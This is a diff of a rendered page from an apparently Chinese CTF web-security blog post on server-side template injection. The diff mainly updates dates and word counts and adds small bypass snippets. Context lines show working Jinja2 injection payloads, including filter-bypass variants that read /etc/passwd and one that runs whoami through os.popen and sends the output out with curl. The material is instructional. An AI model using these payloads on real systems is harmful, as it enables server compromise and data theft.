@@ -33,7 +33,7 @@
 <meta property="og:image" content="http://www.caterpie771.cn/wp-content/uploads/myimgs/6066fbff4ce29a6a6a2d4748584b27f9.png">
 <meta property="og:image" content="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250307213236244.png">
 <meta property="article:published_time" content="2025-01-22T01:58:22.000Z">
-<meta property="article:modified_time" content="2025-09-17T08:42:12.255Z">
+<meta property="article:modified_time" content="2026-04-25T06:57:13.321Z">
 <meta property="article:author" content="AyaN0">
 <meta property="article:tag" content="-CTF -Web">
 <meta name="twitter:card" content="summary">
@@ -181,7 +181,7 @@
   <nav class="site-state">
       <div class="site-state-item site-state-posts">
         <a href="/archives/">
-          <span class="site-state-item-count">28</span>
+          <span class="site-state-item-count">30</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
@@ -261,7 +261,7 @@
         <i class="far fa-calendar-check"></i>
       </span>
       <span class="post-meta-item-text">更新于</span>
-      <time title="修改时间：2025-09-17 16:42:12" itemprop="dateModified" datetime="2025-09-17T16:42:12+08:00">2025-09-17</time>
+      <time title="修改时间：2026-04-25 14:57:13" itemprop="dateModified" datetime="2026-04-25T14:57:13+08:00">2026-04-25</time>
     </span>
 
   
@@ -278,7 +278,7 @@
         <i class="far fa-file-word"></i>
       </span>
       <span class="post-meta-item-text">本文字数：</span>
-      <span>32k</span>
+      <span>33k</span>
     </span>
     <span class="post-meta-item" title="阅读时长">
       <span class="post-meta-item-icon">
@@ -307,6 +307,7 @@
 <p>贴个图</p>
 <p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/ssti.png" alt="ssti"></p>
 <p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/ssti2.png" alt="ssti2"></p>
+<pre><code class="highlight plaintext">&lt;%= %&gt;</code></pre>
 <h3 id="第一层"><a class="markdownIt-Anchor" href="#第一层"></a> 第一层：</h3>
 <ul>
 <li>如果可以执行${7*7}的结果，那我们进入第二层的<code>a&#123;*comment*&#125;b</code>，如果没用执行结果，那就进入第二层的<code>&#123;&#123;7*7&#125;&#125;</code></li>
@@ -555,6 +556,8 @@ post:arg1=open&amp;arg2=/etc/passwd</code></pre>
 <p><strong>过滤下划线</strong></p>
 <pre><code class="highlight plaintext">&#123;&#123;&#x27;&#x27;[request.args.class][request.args.mro][2][request.args.subclasses]()[40](&#x27;/etc/passwd&#x27;).read() &#125;&#125;&amp;class=__class__&amp;mro=__mro__&amp;subclasses=__subclasses__
 //request.args.xx就能直接查询对应的参数值，把原参数换成[request.args.xx]即可</code></pre>
+<p>还可以编码绕过</p>
+<pre><code class="highlight plaintext">_﹍subclasses_﹍</code></pre>
 <p><strong>过滤花括号</strong></p>
 <pre><code class="highlight plaintext">#用&#123;%%&#125;标记，同时外带
 &#123;% if &#x27;&#x27;.__class__.__mro__[2].__subclasses__()[59].__init__.func_globals.linecache.os.popen(&#x27;curl http://127.0.0.1:7999/?i=`whoami`&#x27;).read()==&#x27;p&#x27; %&#125;1&#123;% endif %&#125;
@@ -1196,7 +1199,7 @@ func StringTpl2Exam(w http.ResponseWriter, r *http.Request) &#123;
 
   <div class="copyright">
     &copy; 
-    <span itemprop="copyrightYear">2025</span>
+    <span itemprop="copyrightYear">2026</span>
     <span class="with-love">
       <i class="fa fa-heart"></i>
     </span>
@@ -1207,13 +1210,13 @@ func StringTpl2Exam(w http.ResponseWriter, r *http.Request) &#123;
     <span class="post-meta-item-icon">
       <i class="fa fa-chart-line"></i>
     </span>
-    <span title="站点总字数">363k</span>
+    <span title="站点总字数">380k</span>
   </span>
   <span class="post-meta-item">
     <span class="post-meta-item-icon">
       <i class="fa fa-coffee"></i>
     </span>
-    <span title="站点阅读时长">10:59</span>
+    <span title="站点阅读时长">11:30</span>
   </span>
 </div>
 <div class="busuanzi-count">
